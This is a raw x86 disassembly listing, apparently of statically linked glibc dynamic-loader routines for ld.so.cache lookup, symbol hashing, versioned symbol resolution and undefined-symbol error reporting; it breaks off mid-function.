mov dword [var_14h], 0
mov ecx, dword [edx + 0x14]
dec ecx
cmp dword [var_14h], ecx
mov dword [var_18h], ecx
jg 0x807daaa
lea esi, [esi]
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea edi, [eax*8]
mov eax, dword [ebx + edi + 0x34]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dae0
jl 0x807dada
dec esi
mov dword [var_18h], esi
mov edx, dword [var_18h]
cmp dword [var_14h], edx
jg 0x807daaa
mov ebx, dword [0x80aaa04]
jmp 0x807da60
test byte [0x80aac10], 1
jne 0x807dabe
mov eax, dword [var_24h]
add esp, 0x4c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_24h]
test eax, eax
je 0x807dab3
mov eax, dword [var_24h]
mov dword [esp], str.__trying_file_s_n
mov dword [var_4h], eax
call fcn.08081c40
jmp 0x807dab3
inc esi
mov dword [var_14h], esi
jmp 0x807da9a
test esi, esi
mov dword [var_14h], esi
jle 0x807db10
mov ebx, dword [0x80aaa04]
mov eax, dword [ebx + edi + 0x1c]
cmp eax, dword [var_20h]
jae 0x807db16
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807db10
dec esi
sub edi, 0x18
test esi, esi
jg 0x807dae7
nop
mov ebx, dword [0x80aaa04]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ebx + eax*8]
lea edi, [ebx + 0x30]
jle 0x807db45
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_28h]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov ebx, dword [ebx + 0x30]
cmp ebx, 1
mov dword [var_38h], ebx
je 0x807db60
cmp ebx, 3
je 0x807db60
inc esi
cmp esi, dword [var_18h]
jle 0x807db10
jmp 0x807daaa
mov eax, dword [edi + 8]
mov edx, dword [var_20h]
cmp eax, edx
mov dword [var_3ch], eax
jae 0x807db55
mov ecx, dword [var_24h]
test ecx, ecx
je 0x807db7f
mov ecx, dword [var_38h]
cmp ecx, dword [0x80a95c4]
jne 0x807db55
mov eax, dword [0x80aac6c]
test eax, eax
je 0x807db8d
cmp dword [edi + 0xc], eax
ja 0x807db55
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
not edx
not eax
or edx, eax
je 0x807dc04
mov edx, dword [edi + 0x14]
mov eax, dword [edi + 0x10]
xor ecx, ecx
mov dword [var_40h], edx
mov dword [var_44h], eax
mov ebx, dword [var_40h]
and ebx, 0xf0000
mov edx, ebx
or edx, ecx
je 0x807dbc6
mov edx, dword [var_2ch]
mov eax, dword [var_30h]
xor edx, ebx
xor eax, ecx
or edx, eax
jne 0x807db55
xor edx, edx
mov eax, dword [0x80aa848]
or edx, 0x800f0000
not edx
and edx, dword [var_40h]
not eax
and eax, dword [var_44h]
mov ecx, edx
or ecx, eax
jne 0x807db55
mov edi, dword [var_28h]
mov eax, dword [var_38h]
add edi, dword [var_3ch]
cmp eax, dword [0x80a95c4]
mov dword [var_24h], edi
jne 0x807db55
jmp 0x807daaa
mov eax, dword [edi + 0x10]
mov edx, dword [edi + 0x14]
mov dword [var_44h], eax
mov dword [var_40h], edx
jmp 0x807dbc6
lea eax, [edi + 0x30]
jmp 0x807da15
mov edx, dword [ecx + 0xc]
mov esi, dword [0x80aaa08]
mov dword [var_14h], 0
lea eax, [edx + edx*2]
add esi, ecx
dec edx
lea eax, [ecx + eax*4 + 0x10]
mov dword [var_18h], edx
sub esi, eax
mov dword [var_1ch], eax
cmp dword [var_24h], edx
mov dword [var_20h], esi
jg 0x807daaa
mov eax, dword [var_14h]
add eax, dword [var_18h]
mov edx, eax
shr edx, 0x1f
lea esi, [edx + eax]
sar esi, 1
lea eax, [esi + esi*2]
lea ebx, [eax*4]
mov eax, dword [ecx + ebx + 0x14]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
je 0x807dca0
jl 0x807dc9a
dec esi
mov dword [var_18h], esi
mov edi, dword [var_18h]
cmp dword [var_14h], edi
jg 0x807daaa
mov ecx, dword [0x80aaa00]
jmp 0x807dc48
inc esi
mov dword [var_14h], esi
jmp 0x807dc86
test esi, esi
mov dword [var_14h], esi
jle 0x807dcd0
mov ecx, dword [0x80aaa00]
mov eax, dword [ecx + ebx + 8]
cmp eax, dword [var_20h]
jae 0x807dcd6
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807dcd0
dec esi
sub ebx, 0xc
test esi, esi
jg 0x807dca7
nop
mov ecx, dword [0x80aaa00]
cmp esi, dword [var_14h]
lea eax, [esi + esi*2]
lea ebx, [ecx + eax*4]
lea edi, [ebx + 0x10]
jle 0x807dd05
mov eax, dword [edi + 4]
cmp eax, dword [var_20h]
jae 0x807daaa
mov edx, dword [var_1ch]
add edx, eax
mov eax, dword [var_10h]
call fcn.0807d880
test eax, eax
jne 0x807daaa
mov eax, dword [ebx + 0x10]
cmp eax, 1
je 0x807dd1d
cmp eax, 3
je 0x807dd1d
inc esi
cmp esi, dword [var_18h]
jle 0x807dcd0
jmp 0x807daaa
mov ecx, dword [edi + 8]
cmp ecx, dword [var_20h]
jae 0x807dd12
mov edx, dword [var_24h]
test edx, edx
je 0x807dd45
mov edx, dword [0x80a95c4]
cmp eax, edx
jne 0x807dd12
add ecx, dword [var_1ch]
cmp eax, edx
mov dword [var_24h], ecx
jne 0x807dd12
jmp 0x807daaa
mov edx, dword [0x80a95c4]
jmp 0x807dd36
mov ecx, 1
mov edx, 0x80aaa08
mov eax, str._etc_ld.so.cache
call fcn.080817c0
cmp eax, 0xffffffff
mov ebx, eax
je 0x807de1e
mov eax, dword [0x80aaa08]
cmp eax, 0x10
mov dword [var_48h], eax
jbe 0x807dddc
mov edx, str.ld.so_1.7.0
mov eax, 0xb
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807dddc
mov eax, dword [ebx + 0xc]
mov dword [0x80aaa00], ebx
lea eax, [eax + eax*2]
lea eax, [eax*4 + 0x10]
lea ebx, [eax + ebx]
add eax, 0x30
cmp dword [var_48h], eax
mov dword [0x80aaa04], ebx
jb 0x807ddc2
mov edi, str.glibc_ld.so.cache1.1
mov ecx, 0x14
mov esi, ebx
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x807ddcc
mov dword [0x80aaa04], 0xffffffff
mov ecx, dword [0x80aaa00]
test ecx, ecx
jne 0x807d9a7
jmp 0x807de43
cmp ebx, 0xffffffff
je 0x807de1e
cmp dword [var_48h], 0x30
jbe 0x807de0a
mov edx, str.glibc_ld.so.cache1.1
mov eax, 0x14
mov esi, ebx
cld
mov edi, edx
mov ecx, eax
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807de0a
mov dword [0x80aaa04], ebx
mov dword [0x80aaa00], ebx
jmp 0x807ddcc
cmp ebx, 0xffffffff
je 0x807de1e
mov eax, dword [var_48h]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.08054780
mov dword [0x80aaa00], 0xffffffff
jmp 0x807ddcc
mov dword [var_4h], str._etc_ld.so.cache
mov dword [esp], str._search_cache_s_n
call fcn.08081c40
jmp 0x807d999
mov dword [var_ch], str._dl_load_cache_lookup
mov dword [var_8h], 0xeb
mov dword [var_4h], str..._sysdeps_generic_dl_cache.c
mov dword [esp], str.cache_____void__0_
call fcn.0805efc0
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
mov esi, ecx
push ebx
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_10h], ecx
mov eax, dword [eax]
cmp eax, 0xffffffff
je 0x807d6ac
mov edi, eax
mov ecx, dword [eax]
lea esi, [esi]
add edi, 4
cmp byte [esi - 9], 0
je 0x807d6b4
mov eax, dword [esi - 0x10]
inc dword [eax + 4]
mov edx, dword [ecx + 0x10]
add dword [eax], edx
mov eax, dword [edi]
test eax, eax
mov ecx, eax
jne 0x807d690
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi - 4]
mov edx, dword [esi - 0x10]
lea edx, [edx + eax*8]
inc eax
mov dword [esi - 4], eax
lea ebx, [edx + 8]
mov eax, dword [esi - 8]
mov dword [edx + 8], eax
mov eax, dword [ecx + 0x10]
dec eax
mov dword [var_8h], eax
mov eax, dword [ecx + 0xc]
mov dword [var_4h], eax
mov eax, dword [esi - 8]
mov dword [esp], eax
call fcn.08053740
mov dword [esi - 8], eax
mov byte [eax], 0
mov eax, dword [arg_ch]
inc dword [esi - 8]
mov dword [ebx + 4], eax
jmp 0x807d6a4
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 8
mov dword [var_10h], edx
movzx ebx, byte [eax]
test bl, bl
je 0x807d971
movzx ecx, byte [edx]
lea esi, [esi]
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x807d952
lea eax, [ecx - 0x30]
mov edx, 1
cmp al, 9
ja 0x807d941
inc edi
movsx eax, bl
inc dword [var_10h]
movzx ebx, byte [edi]
sub eax, 0x30
mov dword [var_14h], eax
movsx eax, cl
lea esi, [eax - 0x30]
lea eax, [ebx - 0x30]
mov edx, ebx
cmp al, 9
ja 0x807d8fd
lea esi, [esi]
mov ecx, dword [var_14h]
inc edi
movsx edx, dl
movzx ebx, byte [edi]
lea eax, [ecx + ecx*4]
lea eax, [edx + eax*2 - 0x30]
mov dword [var_14h], eax
mov edx, ebx
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x807d8e0
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
ja 0x807d92c
lea esi, [esi]
inc dword [var_10h]
lea eax, [esi + esi*4]
movsx edx, dl
lea esi, [edx + eax*2 - 0x30]
mov eax, dword [var_10h]
movzx ecx, byte [eax]
lea eax, [ecx - 0x30]
mov edx, ecx
cmp al, 9
jbe 0x807d910
cmp dword [var_14h], esi
jne 0x807d94b
test bl, bl
jne 0x807d8a0
movsx edx, bl
movsx eax, cl
sub edx, eax
add esp, 8
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_14h]
sub edx, esi
jmp 0x807d941
lea eax, [ecx - 0x30]
mov edx, 0xffffffff
cmp al, 9
jbe 0x807d941
cmp bl, cl
jne 0x807d939
inc dword [var_10h]
inc edi
mov eax, dword [var_10h]
movzx ebx, byte [edi]
movzx ecx, byte [eax]
jmp 0x807d931
mov eax, dword [var_10h]
movzx ecx, byte [eax]
jmp 0x807d939
push ebp
mov ebp, esp
sub esp, 0x88
mov dword [var_4h], 0
mov dword [esp], eax
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_bp_4h], edi
mov dword [var_70h], 0xffffffff
mov esi, edx
mov edi, ecx
call fcn.08053ec0
test eax, eax
mov ebx, eax
js 0x808181f
lea eax, [var_6ch]
mov dword [var_4h], ebx
mov dword [esp], 3
mov dword [var_sp_8h], eax
call fcn.08053dc0
test eax, eax
js 0x8081817
mov eax, dword [var_40h]
test eax, eax
mov dword [esi], eax
jne 0x808182d
mov dword [esp], ebx
call fcn.08053f20
mov eax, dword [var_70h]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [var_14h], 0
mov dword [var_10h], ebx
mov dword [var_sp_ch], 2
mov dword [var_sp_8h], edi
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov dword [var_70h], eax
jmp 0x8081817
push ebp
xor eax, eax
mov ebp, esp
sub esp, 8
mov dword [esp], ebx
mov dword [var_4h], esi
mov edx, dword [arg_8h]
movzx ecx, byte [edx]
test ecx, ecx
je 0x807df2d
mov eax, ecx
movzx ecx, byte [edx + 1]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 2]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 3]
jecxz 0x807df2d
shl eax, 4
add eax, ecx
movzx ecx, byte [edx + 4]
jecxz 0x807df2d
shl eax, 4
add edx, 5
add eax, ecx
movzx ecx, byte [edx]
jecxz 0x807df2d
shl eax, 4
mov esi, 0xf0000000
inc edx
add eax, ecx
and esi, eax
and eax, 0xfffffff
shr esi, 0x18
movzx ecx, byte [edx]
xor eax, esi
test ecx, ecx
jne 0x807df0f
mov esi, dword [var_4h]
mov ebx, dword [esp]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov edx, dword [arg_20h]
mov eax, dword [arg_18h]
mov ecx, dword [eax]
mov dword [var_10h], edx
mov eax, dword [eax + 4]
mov dword [var_14h], ecx
mov dword [var_18h], eax
lea esi, [esi]
mov edx, dword [var_14h]
mov eax, dword [arg_1ch]
mov dword [var_28h], 0
mov dword [var_2ch], 0
mov edi, dword [edx + eax*4]
mov edx, dword [arg_28h]
test edx, edx
je 0x807df83
cmp edi, dword [var_1ch]
je 0x807df97
test byte [arg_2ch], 2
je 0x807dfae
movzx eax, byte [edi + 0x174]
and eax, 3
test al, al
jne 0x807dfae
inc dword [arg_1ch]
mov eax, dword [var_18h]
cmp dword [arg_1ch], eax
jb 0x807df60
xor edx, edx
add esp, 0x34
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
test byte [0x80aac10], 8
jne 0x807e1fb
mov eax, dword [edi + 0x30]
xor edx, edx
mov eax, dword [eax + 4]
mov dword [var_1ch], eax
mov eax, dword [edi + 0x2c]
mov eax, dword [eax + 4]
mov dword [var_20h], eax
mov eax, dword [edi + 0x18c]
mov dword [var_24h], eax
mov eax, dword [arg_ch]
div dword [edi + 0x164]
mov eax, dword [edi + 0x168]
mov esi, dword [eax + edx*4]
test esi, esi
je 0x807e02b
mov esi, esi
mov ebx, dword [var_1ch]
mov eax, esi
shl eax, 4
add ebx, eax
mov eax, dword [ebx + 4]
test eax, eax
jne 0x807e0ac
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 6
je 0x807e0ac
mov eax, dword [edi + 0x16c]
mov esi, dword [eax + esi*4]
test esi, esi
jne 0x807dff0
cmp dword [var_28h], 1
mov ebx, dword [var_2ch]
je 0x807e02d
xor ebx, ebx
test ebx, ebx
je 0x807e045
movzx eax, byte [ebx + 0xc]
shr al, 4
movzx eax, al
cmp eax, 1
je 0x807e08a
cmp eax, 2
je 0x807e080
test esi, esi
jne 0x807df97
mov eax, dword [var_10h]
test eax, eax
je 0x807df97
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807df97
mov edx, edi
call fcn.08081cd0
mov edx, 0xffffffff
test eax, eax
je 0x807df97
jmp 0x807dfa4
nop
mov ecx, dword [0x80aac48]
test ecx, ecx
jne 0x807e09c
mov edx, dword [arg_14h]
mov dword [edx], ebx
mov dword [edx + 4], edi
mov edx, 1
jmp 0x807dfa4
mov eax, dword [arg_14h]
mov edx, dword [eax]
test edx, edx
jne 0x807e045
mov dword [eax], ebx
mov dword [eax + 4], edi
jmp 0x807e045
cmp word [ebx + 0xe], 0
jne 0x807e0bd
test byte [var_18h], 1
jne 0x807e015
movzx eax, byte [ebx + 0xc]
and eax, 0xf
cmp eax, 2
jle 0x807e0d2
cmp eax, 6
jne 0x807e015
cmp ebx, dword [arg_10h]
je 0x807e0f3
mov eax, dword [var_20h_2]
mov edx, dword [var_4h]
add eax, dword [ebx]
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e015
mov eax, dword [var_10h]
test eax, eax
je 0x807e1a6
mov eax, dword [var_24h]
test eax, eax
je 0x807e184
mov edx, dword [var_24h_2]
mov ecx, dword [var_10h_2]
movzx eax, word [edx + esi*2]
mov edx, dword [edi + 0x17c]
and ax, 0x7fff
movzx eax, ax
shl eax, 4
mov dword [var_30h], eax
mov eax, dword [ecx + 4]
mov ecx, dword [var_30h]
cmp dword [edx + ecx + 4], eax
je 0x807e164
mov eax, dword [var_10h_2]
mov eax, dword [eax + 8]
test eax, eax
jne 0x807e015
mov eax, dword [edi + 0x17c]
mov edx, dword [var_30h]
mov eax, dword [eax + edx + 4]
test eax, eax
jne 0x807e015
mov ecx, dword [var_24h_2]
cmp word [ecx + esi*2], 0
js 0x807e015
jmp 0x807e031
mov ecx, dword [var_10h_2]
mov eax, dword [ecx]
mov ecx, dword [var_30h]
mov dword [var_4h], eax
mov eax, dword [edx + ecx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
jne 0x807e12e
jmp 0x807e031
mov ecx, dword [var_10h]
mov eax, dword [ecx + 0xc]
test eax, eax
je 0x807e031
mov edx, edi
call fcn.08081cd0
test eax, eax
je 0x807e031
jmp 0x807e226
mov eax, dword [var_24h]
test eax, eax
je 0x807e031
test byte [arg_24h], 2
je 0x807e1e8
mov eax, dword [var_24h]
movzx edx, word [eax + esi*2]
mov eax, edx
and eax, 0x7fff
dec eax
jle 0x807e031
test dx, dx
js 0x807e015
inc dword [var_28h]
cmp dword [var_28h], 1
cmovne ebx, dword [var_2ch]
mov dword [var_2ch], ebx
jmp 0x807e015
mov ecx, dword [var_24h]
movzx edx, word [ecx + esi*2]
mov eax, edx
and eax, 0x7fff
cmp eax, 2
jmp 0x807e1c6
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807e20a
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov ecx, dword [var_4h]
mov dword [var_8h], eax
mov dword [esp], str.symbol_s___lookup_in_file_s_n
mov dword [var_4h], ecx
call fcn.08081c40
jmp 0x807dfbb
mov dword [var_ch], str.do_lookup_x
mov dword [var_8h], 0x6d
mov dword [var_4h], str.do_lookup.h
mov dword [esp], str.version__filename____void__0______dl_name_match_p__version__filename__map_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
test byte [0x80aac10], 4
mov dword [var_4h], ebx
mov ecx, dword [edx + 4]
mov ebx, dword [arg_10h]
je 0x807e9d7
mov dword [var_10h], eax
mov edx, str.protected
mov eax, dword [arg_18h]
test eax, eax
mov eax, str.normal
cmove edx, eax
mov eax, dword [arg_ch]
mov dword [var_ch], edx
mov eax, dword [eax + 4]
mov eax, dword [eax + 4]
cmp byte [eax], 0
jne 0x807e997
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h], eax
cmp byte [ecx], 0
jne 0x807e9ec
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov dword [var_sp_4h], edx
mov dword [esp], str.binding_file__s_to__s:__s_symbol___s
call fcn.08081c40
test ebx, ebx
je 0x807e9de
mov eax, dword [ebx]
mov dword [esp], str.___s__n
mov dword [var_sp_4h], eax
call fcn.08081c70
mov ebx, dword [var_4h]
leave
ret 0x14
mov dword [esp], 0x809302e
call fcn.08081c70
jmp 0x807e9d7
mov edx, ecx
jmp 0x807e9b1
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_bp_8h], esi
mov dword [var_bp_ch], ebx
mov dword [var_bp_4h], edi
mov esi, eax
mov ebx, edx
mov dword [var_10h_2], 0
xor eax, eax
cmp esi, edx
je 0x807e2bf
mov eax, 0
test eax, eax
je 0x807e285
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [esi + 0x170]
test eax, eax
jne 0x807e299
mov eax, dword [ebx + 0x170]
test eax, eax
je 0x807e2a7
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x807e2ca
mov eax, 0
test eax, eax
je 0x807e2bc
mov dword [esp], 0x80a95d4
call section.
mov eax, dword [var_10h_2]
mov ebx, dword [var_bp_ch]
mov esi, dword [var_bp_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov edx, dword [ebx + 0x1ec]
test dl, 8
jne 0x807e2a7
movzx eax, byte [esi + 0x174]
and eax, 3
cmp al, 2
je 0x807e2f4
inc dword [ebx + 0x170]
or edx, 8
mov dword [ebx + 0x1ec], edx
jmp 0x807e2a7
test byte [esi + 0x1ec], 8
jne 0x807e2e3
mov edi, dword [esi + 0x150]
test edi, edi
je 0x807e321
mov ecx, dword [esi + 0x1d8]
xor edx, edx
mov eax, dword [ecx]
test eax, eax
je 0x807e321
cmp eax, ebx
je 0x807e2a7
inc edx
mov eax, dword [ecx + edx*4]
test eax, eax
jne 0x807e315
mov edi, dword [esi + 0x1e0]
xor edx, edx
mov ecx, dword [esi + 0x1e4]
cmp edx, edi
jae 0x807e341
cmp dword [ecx + edx*4], ebx
je 0x807e2a7
inc edx
cmp edx, edi
jb 0x807e333
mov eax, dword [0x80aac58]
test eax, eax
je 0x807e444
cmp eax, ebx
je 0x807e361
mov eax, dword [eax + 0xc]
test eax, eax
je 0x807e444
cmp eax, ebx
jne 0x807e352
test eax, eax
je 0x807e444
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jae 0x807e3fe
mov eax, dword [esi + 0x1e0]
mov edx, dword [esi + 0x1e4]
mov dword [edx + eax*4], ebx
inc eax
mov dword [esi + 0x1e0], eax
mov ecx, dword [ebx + 0x150]
test ecx, ecx
je 0x807e3e1
inc dword [ebx + 0x170]
test byte [0x80aac10], 0x40
je 0x807e2a7
mov eax, dword [esi + 4]
cmp byte [eax], 0
jne 0x807e3b9
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_8h_2], eax
mov eax, dword [ebx + 4]
cmp byte [eax], 0
jne 0x807e3cc
mov eax, dword [0x80a95a8]
mov eax, dword [eax]
mov dword [var_4h_2], eax
mov dword [esp], str._nfile_s___needed_by__s__relocation_dependency__n_n
call fcn.08081c40
jmp 0x807e2a7
mov ecx, dword [ebx + 0x1d8]
mov eax, dword [ecx]
test eax, eax
je 0x807e39d
add ecx, 4
inc dword [eax + 0x170]
mov eax, dword [ecx]
test eax, eax
jne 0x807e3ed
jmp 0x807e39d
add eax, 5
mov dword [esp], ecx
mov dword [esi + 0x1dc], eax
shl eax, 2
mov dword [var_4h_2], eax
call fcn.08051220
test eax, eax
je 0x807e433
mov dword [esi + 0x1e4], eax
mov eax, dword [esi + 0x1dc]
cmp edi, eax
jb 0x807e377
jmp 0x807e38d
mov eax, dword [esi + 0x1dc]
sub eax, 5
mov dword [esi + 0x1dc], eax
jmp 0x807e426
mov dword [var_10h_2], 0xffffffff
jmp 0x807e2a7
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
push ebx
sub esp, 0x84
mov dword [var_54h], ecx
mov dword [var_50h], edx
mov dword [esp], eax
call fcn.0807dec0
mov ebx, dword [arg_8h]
mov dword [var_58h], eax
mov dword [var_44h], 0
mov dword [var_40h], 0
mov eax, dword [arg_ch]
test eax, eax
jne 0x807e8e6
mov eax, dword [arg_18h]
xor esi, esi
test eax, eax
jne 0x807e89a
mov ecx, dword [arg_8h]
mov edx, dword [ecx]
test edx, edx
mov eax, esi
je 0x807e4ff
mov edx, dword [arg_10h]
mov ecx, dword [arg_18h]
mov dword [var_14h], eax
mov dword [var_24h], edx
mov dword [var_20h], ecx
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_1ch], edx
mov edx, dword [var_54h]
mov dword [var_18h], ecx
mov ecx, dword [var_58h]
mov eax, dword [ebx]
mov dword [var_10h], eax
lea eax, [var_44h]
mov dword [var_sp_ch], eax
mov eax, dword [edx]
mov dword [esp], edi
mov dword [var_4h], ecx
mov dword [var_8h], eax
call fcn.0807df40
test eax, eax
mov ecx, eax
jg 0x807e4ff
jl 0x807e785
add ebx, 4
xor eax, eax
mov edx, dword [ebx]
test edx, edx
jne 0x807e4a3
mov ebx, dword [var_44h]
test ebx, ebx
je 0x807e696
mov ecx, dword [var_54h]
mov dword [var_64h], 0
mov edx, dword [ecx]
test edx, edx
je 0x807e52a
movzx eax, byte [edx + 0xd]
and eax, 3
cmp eax, 3
je 0x807e5d9
mov edx, dword [var_40h]
movzx eax, byte [edx + 0x174]
and eax, 3
cmp al, 2
je 0x807e590
test dword [0x80aac10], 0x204
jne 0x807e55c
mov eax, dword [var_44h]
mov edx, dword [var_54h]
mov dword [edx], eax
mov eax, dword [var_40h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0x14
mov ecx, dword [var_64h]
mov eax, dword [arg_10h]
mov edx, dword [arg_ch]
mov dword [var_10h], ecx
mov dword [var_sp_ch], eax
lea ecx, [var_44h]
mov eax, dword [arg_8h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov edx, dword [var_50h]
mov ecx, dword [var_54h]
mov dword [esp], eax
mov eax, edi
call fcn.0807e950
sub esp, 0x14
jmp 0x807e547
test byte [arg_14h], 1
je 0x807e53b
mov eax, dword [var_50h]
call fcn.0807e250
test eax, eax
jns 0x807e53b
mov edx, dword [arg_14h]
mov eax, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_sp_ch], edx
mov dword [var_10h], eax
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
mov dword [var_8h], ecx
mov ecx, dword [var_54h]
mov dword [esp], edx
mov edx, dword [var_50h]
mov dword [var_4h], eax
mov eax, edi
call fcn.0807e450
sub esp, 0x14
jmp 0x807e552
cmp dword [arg_10h], 1
mov dword [var_64h], 1
je 0x807e67f
mov ebx, dword [arg_8h]
mov dword [var_4ch], 0
mov dword [var_48h], 0
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov eax, dword [arg_18h]
mov ecx, dword [arg_14h]
mov dword [var_24h], 1
mov dword [var_14h], esi
mov dword [var_20h], eax
mov dword [var_1ch], ecx
mov eax, dword [arg_ch]
lea ecx, [var_4ch]
mov dword [var_18h], eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_sp_ch], ecx
mov dword [var_8h], edx
mov dword [var_10h], eax
mov eax, dword [var_58h]
mov dword [var_4h], eax
call fcn.0807df40
test eax, eax
jne 0x807e658
add ebx, 4
xor esi, esi
mov eax, dword [ebx]
test eax, eax
je 0x807e658
mov ecx, dword [var_54h]
mov edx, dword [ecx]
jmp 0x807e601
mov eax, dword [var_4ch]
test eax, eax
je 0x807e52a
mov edx, dword [var_50h]
cmp dword [var_48h], edx
je 0x807e52a
mov ecx, dword [var_54h]
mov dword [var_40h], edx
mov eax, dword [ecx]
mov dword [var_44h], eax
jmp 0x807e52a
mov eax, dword [var_50h]
cmp dword [var_40h], eax
je 0x807e52a
mov dword [var_44h], edx
mov dword [var_40h], eax
jmp 0x807e52a
mov edx, dword [var_54h]
mov eax, dword [edx]
test eax, eax
je 0x807e6aa
movzx eax, byte [eax + 0xc]
shr al, 4
cmp al, 2
je 0x807e6b1
mov ecx, dword [arg_18h]
test ecx, ecx
je 0x807e6c1
mov edx, dword [var_54h]
mov dword [edx], 0
xor eax, eax
jmp 0x807e552
mov edx, dword [var_50h]
mov dword [var_60h], 0x80a4f11
test edx, edx
je 0x807e6d8
mov ecx, dword [var_50h]
mov ecx, dword [ecx + 4]
mov dword [var_60h], ecx
mov eax, dword [arg_ch]
mov edx, str.__version_
test eax, eax
mov eax, 0x80a4f11
cmove edx, eax
je 0x807e6f5
mov ecx, dword [arg_ch]
mov eax, dword [ecx]
test eax, eax
jne 0x807e6fa
mov eax, 0x80a4f11
mov dword [var_3ch], str.undefined_symbol:_
mov dword [var_38h], edi
mov dword [var_34h], edx
mov dword [var_30h], eax
mov esi, 1
xor ebx, ebx
mov eax, dword [ebp + ebx*4 - 0x3c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 3
jbe 0x807e711
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
mov edx, esi
mov eax, dword [ebp + ebx*4 - 0x3c]
mov dword [esp], edx
inc ebx
mov dword [var_4h], eax
call fcn.080773c0
cmp ebx, 3
mov edx, eax
jbe 0x807e738
mov eax, dword [var_60h]
cmp byte [eax], 0
jne 0x807e780
mov eax, dword [0x80a95a8]
mov edx, str._main_program_
mov eax, dword [eax]
test eax, eax
cmovne edx, eax
mov ecx, str.symbol_lookup_error
xor eax, eax
mov dword [esp], esi
call fcn.08081380
sub esp, 4
jmp 0x807e6b1
mov edx, dword [var_60h]
jmp 0x807e769
mov eax, dword [arg_18h]
test eax, eax
jne 0x807e4f4
mov esi, dword [arg_ch]
test esi, esi
je 0x807e876
mov ebx, dword [var_50h]
mov dword [var_5ch], 0
test ebx, ebx
je 0x807e7b2
mov eax, dword [var_50h]
mov eax, dword [eax + 4]
mov dword [var_5ch], eax
mov edx, dword [arg_ch]
mov dword [var_2ch], str.symbol_
mov dword [var_28h], edi
mov dword [var_bp_24h], str.__version_
cmp ecx, 0xfffffffe
mov esi, 1
mov eax, dword [edx]
mov dword [var_bp_1ch], str._not_defined_in_file_
mov dword [var_bp_20h], eax
mov eax, dword [edx + 0xc]
mov edx, str.__no_version_symbols_
mov dword [var_bp_14h], str._with_link_time_reference
mov dword [var_bp_18h], eax
mov eax, 0x80a4f11
cmovne edx, eax
xor ebx, ebx
mov dword [var_bp_10h], edx
mov eax, dword [ebp + ebx*4 - 0x2c]
inc ebx
mov dword [esp], eax
call fcn.08053400
add esi, eax
cmp ebx, 7
jbe 0x807e7f9
lea eax, [esi + 0x12]
xor ebx, ebx
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_37h]
and esi, 0xfffffff0
